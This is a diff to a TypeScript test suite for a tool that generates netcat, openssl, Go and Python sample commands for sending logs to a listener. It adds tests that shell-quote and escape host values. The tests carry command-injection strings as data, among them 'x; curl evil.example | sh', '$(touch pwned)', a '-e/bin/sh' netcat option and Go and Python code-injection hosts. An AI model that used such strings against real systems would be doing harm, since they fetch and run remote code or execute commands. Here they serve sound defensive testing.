@@ -14,6 +14,7 @@ import {
   examplesNote,
   sendTarget,
   senderTime,
+  shellQuote,
   tlsTestCommand,
 } from './send-guide';
 
@@ -31,7 +32,6 @@ const target = (over: Partial<SendTarget> = {}): SendTarget => ({
   framing: 'delimited',
   tls: false,
   requireClientCert: false,
-  serverName: '',
   allow: [],
   ...over,
 });
@@ -51,7 +51,6 @@ describe('send guide', () => {
       framing: 'line',
       tls: true,
       requireClientCert: true,
-      serverName: '',
       allow: [],
     });
     expect(endpointLabel(t)).toBe('sentinel.example:6000/tcp');
@@ -61,10 +60,9 @@ describe('send guide', () => {
     expect(sendTarget(feed('opensky', {}))).toBeNull();
   });
 
-  it('reads the allowlist and the certificate name from the config', () => {
-    const t = sendTarget(feed('tcp', { mode: 'listen', port: 6000, allow: ['10.0.0.0/8', 5, '192.168.1.5'], tls: { enabled: true, serverName: 'sentinel.example' } }))!;
+  it('reads the allowlist from the config', () => {
+    const t = sendTarget(feed('tcp', { mode: 'listen', port: 6000, allow: ['10.0.0.0/8', 5, '192.168.1.5'], tls: { enabled: true } }))!;
     expect(t.allow).toEqual(['10.0.0.0/8', '192.168.1.5']);
-    expect(t.serverName).toBe('sentinel.example');
     expect(sendTarget(feed('udp', { port: 1, allow: 'anyone' }))!.allow).toEqual([]);
     // Datagrams have no TLS, whatever a stray key says.
     expect(sendTarget(feed('udp', { port: 1, tls: { enabled: true } }))!.tls).toBe(false);
@@ -73,6 +71,29 @@ describe('send guide', () => {
     expect([noTls.tls, noTls.requireClientCert]).toEqual([false, false]);
     // An empty format is the default one.
     expect(sendTarget(feed('tcp', { mode: 'listen', port: 1, format: '' }))!.format).toBe('sentinel');
+  });
+
+  it('a listener guide names the listener host, whatever tls.serverName holds', () => {
+    // tls.serverName is what Sentinel checks when it dials out; a listener ignores it. A connection
+    // switched from connect to listen keeps it, and it must not reach a sample, least of all a
+    // command someone copies into a shell.
+    const stale = 'x; curl evil.example | sh';
+    const config = { mode: 'listen', port: 6000, encoding: 'json', tls: { enabled: true, requireClientCert: true, serverName: stale } };
+    const running = sendTarget(feed('tcp', config, { listen: { protocol: 'tcp', host: 'sentinel.example', port: 6000 } }))!;
+
+    const samples = { openssl: tlsTestCommand(running)!, go: goSnippet(running), python: pythonSnippet(running) };
+    for (const [name, sample] of Object.entries(samples)) {
+      expect([name, sample.includes('curl'), sample.includes('evil')]).toEqual([name, false, false]);
+    }
+    expect(samples.openssl).toContain('-connect sentinel.example:6000 -servername sentinel.example -CAfile ca.pem');
+    expect(samples.go).toContain('ServerName: "sentinel.example"');
+    expect(samples.python).toContain('server_hostname="sentinel.example"');
+
+    // Before it runs there is no host, so the placeholder is the name, not the stale setting.
+    const waiting = sendTarget(feed('tcp', config))!;
+    expect(tlsTestCommand(waiting)).toContain('-servername LISTENER_HOST');
+    expect(goSnippet(waiting)).toContain('ServerName: "LISTENER_HOST"');
+    expect(pythonSnippet(waiting)).toContain('server_hostname="LISTENER_HOST"');
   });
 
   it('derives framing from detail, then config, then the format', () => {
@@ -160,7 +181,8 @@ describe('send guide', () => {
     expect(endpointLabel(target({ host: '2001:db8::1' }))).toBe('[2001:db8::1]:6000/tcp');
     expect(endpointLabel(target({ host: '' }))).toBe('listener:6000/tcp');
     expect(goSnippet(target({ host: '2001:db8::1' }))).toContain('net.Dial("tcp", "[2001:db8::1]:6000")');
-    expect(tlsTestCommand(jsonTarget({ tls: true, host: '2001:db8::1' }))).toContain('-connect [2001:db8::1]:6000 -servername 2001:db8::1');
+    // The brackets are a shell pattern (zsh refuses an unquoted one), so the address is quoted.
+    expect(tlsTestCommand(jsonTarget({ tls: true, host: '2001:db8::1' }))).toContain("-connect '[2001:db8::1]:6000' -servername 2001:db8::1");
   });
 
   describe('Go', () => {
@@ -239,11 +261,11 @@ describe('send guide', () => {
       }
     });
 
-    it('names the certificate it expects, and a placeholder while the host is unknown', () => {
+    it('verifies the certificate for the listener host, with a placeholder while it is unknown', () => {
       expect(goSnippet(target({ host: '' }))).toContain('net.Dial("tcp", "LISTENER_HOST:6000")');
-      const named = goSnippet(target({ tls: true, serverName: 'sentinel.example' }));
-      expect(named).toContain('ServerName: "sentinel.example"');
-      expect(named).toContain('tls.Dial("tcp", "h:6000", cfg)');
+      const tls = goSnippet(target({ tls: true }));
+      expect(tls).toContain('ServerName: "h"');
+      expect(tls).toContain('tls.Dial("tcp", "h:6000", cfg)');
       expect(goSnippet(target({ tls: true, host: '' }))).toContain('ServerName: "LISTENER_HOST"');
     });
 
@@ -284,7 +306,6 @@ describe('send guide', () => {
       expect(mtls).toContain('ctx.load_cert_chain("client.pem", "client.key")');
       expect(mtls.indexOf('load_cert_chain')).toBeLessThan(mtls.indexOf('wrap_socket'));
 
-      expect(pythonSnippet(target({ tls: true, serverName: 'sentinel.example' }))).toContain('server_hostname="sentinel.example"');
       expect(pythonSnippet(target({ host: '' }))).toContain('("LISTENER_HOST", 6000)');
     });
 
@@ -303,7 +324,6 @@ describe('send guide', () => {
     // Client certificate flags only when the listener asks for one.
     expect(tlsTestCommand(jsonTarget({ tls: true, requireClientCert: true }))).toBe(`${base} -cert client.pem -key client.key`);
     expect(tlsTestCommand(jsonTarget({ tls: true, host: '' }))).toContain('-connect LISTENER_HOST:6000 -servername LISTENER_HOST');
-    expect(tlsTestCommand(jsonTarget({ tls: true, serverName: 'sentinel.example' }))).toContain('-connect h:6000 -servername sentinel.example');
     // Only JSON lines over TCP with TLS.
     expect(tlsTestCommand(jsonTarget({ tls: true, protocol: 'udp' }))).toBeNull();
     expect(tlsTestCommand(target({ tls: true }))).toBeNull();
@@ -311,6 +331,100 @@ describe('send guide', () => {
     expect(tlsTestCommand(jsonTarget({ tls: true, framing: 'lengthprefix' }))).toBeNull();
     expect(tlsTestCommand(jsonTarget())).toBeNull();
     expect(tlsTestCommand(jsonTarget({ tls: true, mode: 'connect' }))).toBeNull();
+  });
+
+  describe('values a sample puts in code', () => {
+    const quoted = `'${jsonExample()}'`;
+
+    it('single-quotes a shell word unless it is plainly safe', () => {
+      for (const safe of ['h', 'localhost', 'sentinel.example', '10.0.0.5', '2001:db8::1', 'LISTENER_HOST', 'a-b.c_d', '6000']) {
+        expect(shellQuote(safe)).toBe(safe);
+      }
+      expect(shellQuote('a b')).toBe("'a b'");
+      expect(shellQuote('a;b')).toBe("'a;b'");
+      expect(shellQuote('$(id)')).toBe("'$(id)'");
+      expect(shellQuote('`id`')).toBe("'`id`'");
+      expect(shellQuote('')).toBe("''");
+      expect(shellQuote('a\nb')).toBe("'a\nb'");
+      // The brackets of an IPv6 endpoint are a pattern to a shell.
+      expect(shellQuote('[2001:db8::1]:6000')).toBe("'[2001:db8::1]:6000'");
+      // A quote ends the quoting, so it is written on its own: ' becomes '\''.
+      expect(shellQuote("it's")).toBe("'it'\\''s'");
+      expect(shellQuote("'")).toBe("''\\'''");
+      expect(shellQuote("''")).toBe("''\\'''\\'''");
+    });
+
+    it('quotes the host in the netcat and openssl lines', () => {
+      const nc = (host: string, over: Partial<SendTarget> = {}) => netcatCommand(jsonTarget({ host, ...over }));
+      expect(nc('h; curl evil.example | sh')).toBe(`echo ${quoted} | nc -w1 'h; curl evil.example | sh' 6000`);
+      expect(nc('a b', { protocol: 'udp' })).toBe(`echo ${quoted} | nc -u -w1 'a b' 6000`);
+      expect(nc("o'brien")).toBe(`echo ${quoted} | nc -w1 'o'\\''brien' 6000`);
+      expect(nc('$(touch pwned)')).toContain("nc -w1 '$(touch pwned)' 6000");
+      // An ordinary host, and the placeholder, stay as bare as they were.
+      expect(nc('sentinel.example')).toBe(`echo ${quoted} | nc -w1 sentinel.example 6000`);
+      expect(nc('')).toBe(`echo ${quoted} | nc -w1 LISTENER_HOST 6000`);
+
+      const openssl = (host: string) => tlsTestCommand(jsonTarget({ tls: true, host }))!;
+      expect(openssl('h; curl evil.example | sh')).toBe(
+        `echo ${quoted} | openssl s_client -quiet -no_ign_eof -verify_return_error -connect 'h; curl evil.example | sh:6000' -servername 'h; curl evil.example | sh' -CAfile ca.pem`,
+      );
+      expect(openssl("o'brien")).toContain("-connect 'o'\\''brien:6000' -servername 'o'\\''brien' -CAfile");
+      expect(openssl('sentinel.example')).toContain('-connect sentinel.example:6000 -servername sentinel.example');
+    });
+
+    it('stops a host that begins with a dash from being read as an option', () => {
+      // Quoting does not help here: nc reads '-e/bin/sh' as an option too. "--" ends the options.
+      expect(netcatCommand(jsonTarget({ host: '-e/bin/sh' }))).toBe(`echo ${quoted} | nc -w1 -- '-e/bin/sh' 6000`);
+      expect(netcatCommand(jsonTarget({ host: '-x', protocol: 'udp' }))).toBe(`echo ${quoted} | nc -u -w1 -- -x 6000`);
+      // openssl takes what follows -connect and -servername as its value, whatever it looks like.
+      expect(tlsTestCommand(jsonTarget({ tls: true, host: '-x' }))).toContain('-connect -x:6000 -servername -x -CAfile');
+      expect(netcatCommand(jsonTarget({ host: 'a-b' }))).not.toContain('--');
+    });
+
+    it('writes the host as a Go string literal, as strconv.Quote would', () => {
+      const dialArg = (host: string) => /net\.Dial\("tcp", (.*)\)\n/.exec(goSnippet(target({ host })))![1];
+      expect(dialArg('sentinel.example')).toBe('"sentinel.example:6000"');
+      expect(dialArg('a"b')).toBe('"a\\"b:6000"');
+      expect(dialArg('a\\b')).toBe('"a\\\\b:6000"');
+      // A newline would end the line, so it is written as an escape.
+      expect(dialArg('a\nb')).toBe('"a\\nb:6000"');
+      expect(dialArg('a\tb\rc')).toBe('"a\\tb\\rc:6000"');
+      expect(dialArg('a\u0001b\u007fc')).toBe('"a\\x01b\\x7fc:6000"');
+      expect(dialArg('hé')).toBe('"h\\u00e9:6000"');
+      expect(dialArg('h\u{1f600}')).toBe('"h\\U0001f600:6000"');
+      // A lone surrogate is not text; the replacement character stands in.
+      expect(dialArg('a\ud800b')).toBe('"a\\ufffdb:6000"');
+    });
+
+    it('keeps a quote in the host inside the Go string it is written in', () => {
+      const host = 'x"); os.Exit(1); ("';
+      expect(goSnippet(target({ host }))).toContain('net.Dial("tcp", "x\\"); os.Exit(1); (\\":6000")');
+      expect(goSnippet(target({ host, protocol: 'udp', framing: 'message' }))).toContain('net.Dial("udp", "x\\"); os.Exit(1); (\\":6000")');
+      const tls = goSnippet(target({ host, tls: true }));
+      expect(tls).toContain('tls.Dial("tcp", "x\\"); os.Exit(1); (\\":6000", cfg)');
+      expect(tls).toContain('ServerName: "x\\"); os.Exit(1); (\\""');
+    });
+
+    it('writes the host as a Python string literal, as repr would', () => {
+      const connectArg = (host: string) => /create_connection\(\((.*), 6000\)\)/.exec(pythonSnippet(target({ host })))![1];
+      expect(connectArg('sentinel.example')).toBe('"sentinel.example"');
+      expect(connectArg('a"b')).toBe('"a\\"b"');
+      expect(connectArg("a'b")).toBe(`"a'b"`);
+      expect(connectArg('a\\b')).toBe('"a\\\\b"');
+      expect(connectArg('a\nb')).toBe('"a\\nb"');
+      expect(connectArg('hé')).toBe('"h\\u00e9"');
+      expect(connectArg('h\u{1f600}')).toBe('"h\\U0001f600"');
+    });
+
+    it('keeps a quote in the host inside the Python string it is written in', () => {
+      const host = 'x", 1); __import__("os").system("id"); ("';
+      const literal = '"x\\", 1); __import__(\\"os\\").system(\\"id\\"); (\\""';
+      expect(pythonSnippet(target({ host }))).toContain(`socket.create_connection((${literal}, 6000))`);
+      expect(pythonSnippet(target({ host, protocol: 'udp', framing: 'message' }))).toContain(`s.sendto(data, (${literal}, 6000))`);
+      const tls = pythonSnippet(target({ host, tls: true }));
+      expect(tls).toContain(`socket.create_connection((${literal}, 6000))`);
+      expect(tls).toContain(`server_hostname=${literal}`);
+    });
   });
 
   describe('counters', () => {
